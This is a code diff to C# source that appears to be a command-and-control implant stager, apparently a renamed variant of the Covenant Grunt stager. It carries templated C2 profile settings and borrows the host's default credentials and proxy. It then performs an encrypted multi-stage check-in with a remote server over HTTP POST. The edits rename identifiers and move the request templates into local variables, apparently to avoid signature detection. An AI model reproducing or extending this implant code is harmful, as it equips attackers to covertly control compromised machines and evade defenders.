@@ -23,7 +23,7 @@
     using System.Collections.Generic;
     using System.Security.Cryptography;
 
-    namespace echoCovStg
+    namespace echoCovStr
     {
         public class EchoStg
         {
@@ -77,8 +77,7 @@
                 public static readonly List<string> EchoHeaderNames = @"{{REPLACE_PROFILE_HTTP_HEADER_NAMES}}".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
                 public static readonly List<string> EchoHeaderVals = @"{{REPLACE_PROFILE_HTTP_HEADER_VALUES}}".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
                 public static readonly List<string> EchoHTTPURLs = @"{{REPLACE_PROFILE_HTTP_URLS}}".Split(',').ToList().Select(U => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(U))).ToList();
-                public static readonly string EchoPOSTReq = @"{{REPLACE_PROFILE_HTTP_POST_REQUEST}}".Replace(Environment.NewLine, "\n");
-                public static readonly string EchoPOSTResp = @"{{REPLACE_PROFILE_HTTP_POST_RESPONSE}}".Replace(Environment.NewLine, "\n");
+                
                 public static readonly bool ValCert = bool.Parse(@"{{REPLACE_VALIDATE_CERT}}");
                 public static readonly bool UseCPin = bool.Parse(@"{{REPLACE_USE_CERT_PINNING}}");
             }
@@ -128,14 +127,17 @@
                         return valid;
                     };
                     string ChangedResp = MessageTransform.Transform(Encoding.UTF8.GetBytes(StgOBod));
-                    
+
+                    string EchoPOSTReq = @"{{REPLACE_PROFILE_HTTP_POST_REQUEST}}".Replace(Environment.NewLine, "\n");
+                    string EchoPOSTResp = @"{{REPLACE_PROFILE_HTTP_POST_RESPONSE}}".Replace(Environment.NewLine, "\n");
+
                     string StgOResp = "";
                     MyWeC = new EchoWeCli();
                     MyWeC.UseDefaultCredentials = true;
                     string EchoURI = "";
                     MyWeC.Proxy = WebRequest.DefaultWebProxy;
                     MyWeC.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;
-                    
+
                     foreach (string MyURL in MaStrings.EchoURIs)
                     {
                         try
@@ -170,8 +172,8 @@
                             MyWeC.Headers.Set(MaStrings.EchoHeaderNames[i].Replace("{MyGlobID}", MyGlobID), MaStrings.EchoHeaderVals[i].Replace("{MyGlobID}", MyGlobID));
                         }
                     }
-                    StgOResp = MyWeC.UploadString(EchoURI + MaStrings.EchoHTTPURLs[random.Next(MaStrings.EchoHTTPURLs.Count)].Replace("{MyGlobID}", MyGlobID), String.Format(MaStrings.EchoPOSTReq, ChangedResp));
-                    string pulled = Parse(StgOResp, MaStrings.EchoPOSTResp)[0];
+                    StgOResp = MyWeC.UploadString(EchoURI + MaStrings.EchoHTTPURLs[random.Next(MaStrings.EchoHTTPURLs.Count)].Replace("{MyGlobID}", MyGlobID), String.Format(EchoPOSTReq, ChangedResp));
+                    string pulled = Parse(StgOResp, EchoPOSTResp)[0];
                     pulled = Encoding.UTF8.GetString(MessageTransform.Invert(pulled));
                     List<string> gotten = Parse(pulled, MessForm);
                     string My64IV = gotten[3];
@@ -210,8 +212,8 @@
                             MyWeC.Headers.Set(MaStrings.EchoHeaderNames[i].Replace("{MyGlobID}", MyGlobID), MaStrings.EchoHeaderVals[i].Replace("{MyGlobID}", MyGlobID));
                         }
                     }
-                    StgIResp = MyWeC.UploadString(EchoURI + MaStrings.EchoHTTPURLs[random.Next(MaStrings.EchoHTTPURLs.Count)].Replace("{MyGlobID}", MyGlobID), String.Format(MaStrings.EchoPOSTReq, ChangedResp));
-                    pulled = Parse(StgIResp, MaStrings.EchoPOSTResp)[0];
+                    StgIResp = MyWeC.UploadString(EchoURI + MaStrings.EchoHTTPURLs[random.Next(MaStrings.EchoHTTPURLs.Count)].Replace("{MyGlobID}", MyGlobID), String.Format(EchoPOSTReq, ChangedResp));
+                    pulled = Parse(StgIResp, EchoPOSTResp)[0];
                     pulled = Encoding.UTF8.GetString(MessageTransform.Invert(pulled));
                     gotten = Parse(pulled, MessForm);
                     My64IV = gotten[3];
@@ -247,8 +249,8 @@
                             MyWeC.Headers.Set(MaStrings.EchoHeaderNames[i].Replace("{MyGlobID}", MyGlobID), MaStrings.EchoHeaderVals[i].Replace("{MyGlobID}", MyGlobID));
                         }
                     }
-                    StgIIResp = MyWeC.UploadString(EchoURI + MaStrings.EchoHTTPURLs[random.Next(MaStrings.EchoHTTPURLs.Count)].Replace("{MyGlobID}", MyGlobID), String.Format(MaStrings.EchoPOSTReq, ChangedResp));
-                    pulled = Parse(StgIIResp, MaStrings.EchoPOSTResp)[0];
+                    StgIIResp = MyWeC.UploadString(EchoURI + MaStrings.EchoHTTPURLs[random.Next(MaStrings.EchoHTTPURLs.Count)].Replace("{MyGlobID}", MyGlobID), String.Format(EchoPOSTReq, ChangedResp));
+                    pulled = Parse(StgIIResp, EchoPOSTResp)[0];
                     pulled = Encoding.UTF8.GetString(MessageTransform.Invert(pulled));
                     gotten = Parse(pulled, MessForm);
                     My64IV = gotten[3];
